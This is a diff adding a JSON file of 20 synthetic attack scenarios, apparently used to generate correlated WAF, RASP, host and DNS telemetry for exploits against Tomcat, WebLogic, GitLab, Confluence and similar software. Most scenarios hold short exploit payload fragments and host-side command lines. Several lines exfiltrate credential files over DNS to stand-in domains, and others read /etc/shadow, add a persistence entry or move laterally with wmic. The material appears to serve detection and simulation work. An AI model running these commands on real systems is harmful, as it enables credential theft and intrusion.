@@ -1,0 +1,745 @@
+{
+ "form": "F2",
+ "scenarios": [
+  {
+   "idx": 1,
+   "technique": "Apache Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "stack": "tomcat",
+   "host_num": 77,
+   "path": "/uploads/cmd.jsp/",
+   "carrier": "PUT <%@ page import=\"java.util.*\"%><% Runtime.getRuntime().exec(\"id\")%>",
+   "rasp_evidence": "{\"upload\": \"cmd.jsp\", \"rce\": \"exec\"}",
+   "hids": [
+    "id; hostname /usr/bin/id id; hostname <== /bin/sh -c 'id; hostname' <== /usr/local/tomcat/bin/catalina.sh"
+   ],
+   "ua": "windows-chrome",
+   "dns_base": "vqmxld-2b71.net",
+   "dns_gap_h": 2.4,
+   "dns_steps": [
+    23,
+    35
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    122,
+    0,
+    20,
+    40
+   ]
+  },
+  {
+   "idx": 2,
+   "technique": "JBoss jmx-console MLet MBean 部署（HtmlAdaptor invokeOpByName）",
+   "stack": "java",
+   "host_num": 24,
+   "path": "/HtmlAdaptor",
+   "carrier": "?action=invokeOpByName&name=jboss.admin:service=MLet&methodName=next",
+   "rasp_evidence": "{\"mbean\": \"MLet\", \"invoke\": \"jboss.admin\"}",
+   "hids": [
+    "uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/jboss/jboss-modules.jar"
+   ],
+   "ua": "windows11-edge",
+   "dns_base": "rjbhpu-88ca.com",
+   "dns_gap_h": 18.6,
+   "dns_steps": [
+    41,
+    81
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    119,
+    0,
+    35,
+    70
+   ]
+  },
+  {
+   "idx": 3,
+   "technique": "Apache Axis2 admin 上传 aar webshell 部署服务",
+   "stack": "java",
+   "host_num": 61,
+   "path": "/axis2-admin/upload",
+   "carrier": "POST evil.aar Content-Type: application/octet-stream PK%03%04",
+   "rasp_evidence": "{\"upload\": \"evil.aar\", \"svc\": \"axis\"}",
+   "hids": [
+    "echo /tmp/.svc>>/etc/rc.local sh sh -c 'echo /tmp/.svc>>/etc/rc.local' <== java -jar axis2.jar"
+   ],
+   "ua": "windows-firefox",
+   "dns_base": "wtzsgn-4e0d.org",
+   "dns_gap_h": 0.7,
+   "dns_steps": [
+    57,
+    90
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    85,
+    0,
+    25,
+    65
+   ]
+  },
+  {
+   "idx": 4,
+   "technique": "UEditor 任意文件上传（net controller.ashx catchimage 写马）",
+   "stack": "iis",
+   "host_num": 33,
+   "path": "/ueditor/net/controller.ashx",
+   "carrier": "?action=catchimage&source[]=http://10.20.5.77/x.aspx",
+   "rasp_evidence": "{\"upload\": \"catchimage\"}",
+   "hids": [
+    "wmic /node:10.20.3.71 process call create \"cmd.exe /c whoami\" cmd.exe cmd.exe /c wmic /node:10.20.3.71 proc process call create <== svchost.exe -k netsvcs"
+   ],
+   "ua": "mac-safari",
+   "dns_base": "flyqkd-7a35.io",
+   "dns_gap_h": 44.2,
+   "dns_steps": [
+    45,
+    95
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    62,
+    0,
+    48,
+    96
+   ]
+  },
+  {
+   "idx": 5,
+   "technique": "Spring Boot Actuator heapdump 下载后从内存提取凭据 DNS 外传",
+   "stack": "spring",
+   "host_num": 118,
+   "path": "/actuator/heapdump",
+   "carrier": "GET Range: bytes=0-20971520 Accept-Encoding: gzip",
+   "rasp_evidence": "{\"heapdump\": \"creds_in_mem\"}",
+   "hids": [
+    "for l in $(strings /tmp/h.hprof|base64|fold -w30); do nslookup $l.qzrthm-4a17.net; done strings strings for for l"
+   ],
+   "ua": "linux-x11-chrome",
+   "dns_base": "qzrthm-4a17.net",
+   "dns_gap_h": 1.5,
+   "dns_steps": [
+    67,
+    105
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    58,
+    0,
+    30,
+    60
+   ]
+  },
+  {
+   "idx": 6,
+   "technique": "WebLogic wls-wsat 未授权反序列化（CoordinatorPortType XMLDecoder）",
+   "stack": "java",
+   "host_num": 204,
+   "path": "/wls-wsat/CoordinatorPortType",
+   "carrier": "<WorkContext xmlns=\"http://bea.com/2004/06/soap/workarea/\">",
+   "rasp_evidence": "{\"xml\": \"ProcessBuilder\"}",
+   "hids": [
+    "cat /etc/shadow /bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== java weblogic.Server"
+   ],
+   "ua": "android14-pixel",
+   "dns_base": "bpsxjv-c930.com",
+   "dns_gap_h": 6.8,
+   "dns_steps": [
+    57,
+    93
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    61,
+    0,
+    22,
+    44
+   ]
+  },
+  {
+   "idx": 7,
+   "technique": "Nacos 默认 JWT 密钥伪造 token 后配置注入触发命令执行",
+   "stack": "spring",
+   "host_num": 9,
+   "path": "/nacos/v1/cs/configs",
+   "carrier": "?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:[\"/bin/sh\",\"id\"]",
+   "rasp_evidence": "{\"jwt\": \"nacos_default_secret\"}",
+   "hids": [
+    "for l in $(cat /home/nacos/conf/cluster.conf|base64|fold -w30); do nslookup $l.mnwcug-15ef.org; done for for l"
+   ],
+   "ua": "ios-iphone",
+   "dns_base": "mnwcug-15ef.org",
+   "dns_gap_h": 0.9,
+   "dns_steps": [
+    34,
+    85
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    62,
+    0,
+    60,
+    120
+   ]
+  },
+  {
+   "idx": 8,
+   "technique": "Grafana CVE-2024-9264 SQL 表达式命令执行（api/ds/query COPY TO PROGRAM）",
+   "stack": "go",
+   "host_num": 14,
+   "path": "/api/ds/query",
+   "carrier": "POST {\"queries\":[{\"expr\":\"SELECT 1; COPY (SELECT '') TO PROGRAM 'id'\"}]}",
+   "rasp_evidence": "{\"sql_expr\": \"COPY TO PROGRAM\", \"cmd\": \"id\"}",
+   "hids": [
+    "ps aux /bin/ps ps aux <== /bin/sh -c 'ps aux' <== /usr/sbin/grafana-server"
+   ],
+   "ua": "windows-android13",
+   "dns_base": "khdtqe-6b28.io",
+   "dns_gap_h": 122.5,
+   "dns_steps": [
+    36,
+    91
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    57,
+    0,
+    40,
+    80
+   ]
+  },
+  {
+   "idx": 9,
+   "technique": "Apache Dubbo Hessian 反序列化（application/x-java-serialized-object）",
+   "stack": "java",
+   "host_num": 43,
+   "path": "/api/userService",
+   "carrier": "POST application/x-java-serialized-object rO0ABXNyABFqYXZhLnV0aWw=",
+   "rasp_evidence": "{\"hessian\": \"rO0ABXNyABFqYXZh\"}",
+   "hids": [
+    "for l in $(cat /opt/dubbo/conf/dubbo.properties|base64|fold -w30); do nslookup $l.prsloy-0d4c.net; done for for l"
+   ],
+   "ua": "windows-chrome",
+   "dns_base": "prsloy-0d4c.net",
+   "dns_gap_h": 3.3,
+   "dns_steps": [
+    55,
+    76
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    62,
+    0,
+    28,
+    56
+   ]
+  },
+  {
+   "idx": 10,
+   "technique": "Jenkins Groovy 脚本控制台命令执行（scriptText）",
+   "stack": "java",
+   "host_num": 171,
+   "path": "/scriptText",
+   "carrier": "POST script=def c=%22id%22.execute().text;println c",
+   "rasp_evidence": "{\"script_console\": \"groovy\", \"cmd\": \"id\"}",
+   "hids": [
+    "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== java -jar jenkins.war"
+   ],
+   "ua": "windows11-edge",
+   "dns_base": "xtfwnj-ae63.com",
+   "dns_gap_h": 27.4,
+   "dns_steps": [
+    52,
+    102
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    87,
+    0,
+    33,
+    66
+   ]
+  },
+  {
+   "idx": 11,
+   "technique": "Apache Airflow 示例 DAG 解析 RCE（DagBag 反序列化）",
+   "stack": "python",
+   "host_num": 55,
+   "path": "/dags/upload",
+   "carrier": "POST dag_file=example_trigger.py&content=import os;os.system(\"id\")",
+   "rasp_evidence": "{\"dag_bag\": \"pickle\", \"cmd\": \"os.system\"}",
+   "hids": [
+    "for l in $(grep -i pass /opt/airflow/airflow.cfg|base64|fold -w30); do nslookup $l.glmbcr-39d7.org; done for for l"
+   ],
+   "ua": "windows-firefox",
+   "dns_base": "glmbcr-39d7.org",
+   "dns_gap_h": 58.1,
+   "dns_steps": [
+    48,
+    69
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    115,
+    0,
+    50,
+    100
+   ]
+  },
+  {
+   "idx": 12,
+   "technique": "Metabase CVE-2023-38646 未授权 RCE（api/setup/validate H2 RUNSCRIPT）",
+   "stack": "java",
+   "host_num": 190,
+   "path": "/api/setup/validate",
+   "carrier": "{\"db\":\"h2\",\"init\":\"RUNSCRIPT FROM 'http://10.20.5.19/x.sql'\"}",
+   "rasp_evidence": "{\"h2_init\": \"RUNSCRIPT\"}",
+   "hids": [
+    "id -a /usr/bin/id id -a <== /bin/sh -c 'id -a' <== /usr/bin/java -jar metabase.jar"
+   ],
+   "ua": "mac-safari",
+   "dns_base": "djqkps-f2a0.io",
+   "dns_gap_h": 0.5,
+   "dns_steps": [
+    48,
+    100
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    120,
+    0,
+    24,
+    48
+   ]
+  },
+  {
+   "idx": 13,
+   "technique": "Drupal Drupalgeddon2 CVE-2018-7600 mail post_render 命令执行",
+   "stack": "php",
+   "host_num": 27,
+   "path": "/user/register",
+   "carrier": "?element_parents=account/mail/%23value&mail[#post_render][]=exec",
+   "rasp_evidence": "{\"post_render\": \"exec\", \"php\": \"markup\"}",
+   "hids": [
+    "for l in $(base64 /var/www/html/sites/default/settings.php|fold -w30); do nslookup $l.ynvtkh-8c15.net; done for for l"
+   ],
+   "ua": "linux-x11-chrome",
+   "dns_base": "ynvtkh-8c15.net",
+   "dns_gap_h": 9.6,
+   "dns_steps": [
+    25,
+    56
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    86,
+    0,
+    45,
+    90
+   ]
+  },
+  {
+   "idx": 14,
+   "technique": "Confluence CVE-2023-22515 权限提升创建管理员账号",
+   "stack": "java",
+   "host_num": 66,
+   "path": "/setup/setupadministrator.action",
+   "carrier": "username=svcop&email=svc@ops-corp.com&password=Nx9!aaaA",
+   "rasp_evidence": "{\"setup_bypass\": true}",
+   "hids": [
+    "whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== java -jar confluence.jar"
+   ],
+   "ua": "android14-pixel",
+   "dns_base": "czwlbd-5e72.com",
+   "dns_gap_h": 210.3,
+   "dns_steps": [
+    36,
+    84
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    119,
+    0,
+    38,
+    76
+   ]
+  },
+  {
+   "idx": 15,
+   "technique": "Exchange ProxyNotShell 风格（autodiscover SSRF → EWS 写文件）",
+   "stack": "iis",
+   "host_num": 7,
+   "path": "/autodiscover/autodiscover.json?@a.com/",
+   "carrier": "EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx",
+   "rasp_evidence": "{\"ssrf\": \"adc\"}",
+   "hids": [
+    "wmic /node:10.20.3.44 process call create \"cmd.exe /c powershell -enc SQBFAFgA\" cmd.exe cmd.exe /c wmic <== services.exe"
+   ],
+   "ua": "ios-iphone",
+   "dns_base": "srpmfx-b146.org",
+   "dns_gap_h": 4.7,
+   "dns_steps": [
+    64,
+    99
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    115,
+    0,
+    21,
+    42
+   ]
+  },
+  {
+   "idx": 16,
+   "technique": "GitLab ExifTool CVE-2021-22205 上传 DjVu 图片 RCE",
+   "stack": "rails",
+   "host_num": 34,
+   "path": "/api/v4/projects/4/uploads",
+   "carrier": "POST DjVu AT&TFORM; (metadata \"\\c${system('id')};\")",
+   "rasp_evidence": "{\"exiftool\": \"DjVu\"}",
+   "hids": [
+    "for l in $(cat /etc/gitlab/gitlab-secrets.json|base64|fold -w30); do nslookup $l.hgwqnk-93da.io; done for for l"
+   ],
+   "ua": "windows-android13",
+   "dns_base": "hgwqnk-93da.io",
+   "dns_gap_h": 36.9,
+   "dns_steps": [
+    45,
+    95
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    60,
+    0,
+    55,
+    110
+   ]
+  },
+  {
+   "idx": 17,
+   "technique": "Zabbix CVE-2024-22120 审计日志接口 SQL 注入后客户端外带",
+   "stack": "php",
+   "host_num": 84,
+   "path": "/zabbix.php",
+   "carrier": "?action=auditlog.list&filter_set=1&filter_userid=1+OR+(SELECT+SLEEP(5))",
+   "rasp_evidence": "{\"sqli\": \"auditlog.list\", \"param\": \"userid\"}",
+   "hids": [
+    "for l in $(mysql -e \"select passwd from users\" zabbix|base64|fold -w30); do nslookup $l.lvctzj-7f4e.net; done for for l"
+   ],
+   "ua": "windows-chrome",
+   "dns_base": "lvctzj-7f4e.net",
+   "dns_gap_h": 1.2,
+   "dns_steps": [
+    52,
+    71
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    118,
+    0,
+    26,
+    52
+   ]
+  },
+  {
+   "idx": 18,
+   "technique": "SQL 盲注 OOB 外带（xp_dirtree UNC 令数据库发起 DNS 请求）",
+   "stack": "php",
+   "host_num": 121,
+   "path": "/api/v1/report?id=1",
+   "carrier": "?id=1;EXEC master..xp_dirtree \"\\\\5f71a2c4.tbnxmu-2c8b.com\\a\"",
+   "rasp_evidence": "{\"xp_dirtree\": true, \"oob\": \"dns\"}",
+   "hids": [
+    "ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.6.88 \"mysqldump -uroot app|gzip -c\" ssh <== /usr/sbin/sshd -D"
+   ],
+   "ua": "windows11-edge",
+   "dns_base": "tbnxmu-2c8b.com",
+   "dns_gap_h": 480.0,
+   "dns_steps": [
+    22,
+    39
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    117,
+    0,
+    70,
+    140
+   ]
+  },
+  {
+   "idx": 19,
+   "technique": "XXE OOB 外带（外部实体指向攻击者 DNS 服务器）",
+   "stack": "java",
+   "host_num": 202,
+   "path": "/api/v1/soap/endpoint",
+   "carrier": "<!DOCTYPE r [<!ENTITY % a SYSTEM \"http://10.20.5.19/e.dtd\">%a;]>",
+   "rasp_evidence": "{\"xxe\": \"ext_entity\"}",
+   "hids": [
+    "cat /etc/hostname /bin/cat cat /etc/hostname <== /bin/sh -c 'cat /etc/hostname' <== java -jar /opt/app/api.jar"
+   ],
+   "ua": "windows-firefox",
+   "dns_base": "kqwyvs-6a03.org",
+   "dns_gap_h": 13.8,
+   "dns_steps": [
+    45,
+    86
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    86,
+    0,
+    32,
+    64
+   ]
+  },
+  {
+   "idx": 20,
+   "technique": "Java XStream 反序列化 dynamic-proxy 组件加载 + DNS 信标",
+   "stack": "java",
+   "host_num": 143,
+   "path": "/api/v1/import",
+   "carrier": "<dynamic-proxy><interface>java.lang.Comparable</interface>",
+   "rasp_evidence": "{\"xstream\": \"dynamic-proxy\"}",
+   "hids": [
+    "for l in $(cat /opt/app/config/application.yml|base64|fold -w30); do nslookup $l.pfdrmt-e598.io; done for for l"
+   ],
+   "ua": "mac-safari",
+   "dns_base": "pfdrmt-e598.io",
+   "dns_gap_h": 72.6,
+   "dns_steps": [
+    25,
+    62
+   ],
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    57,
+    0,
+    42,
+    84
+   ]
+  }
+ ]
+}
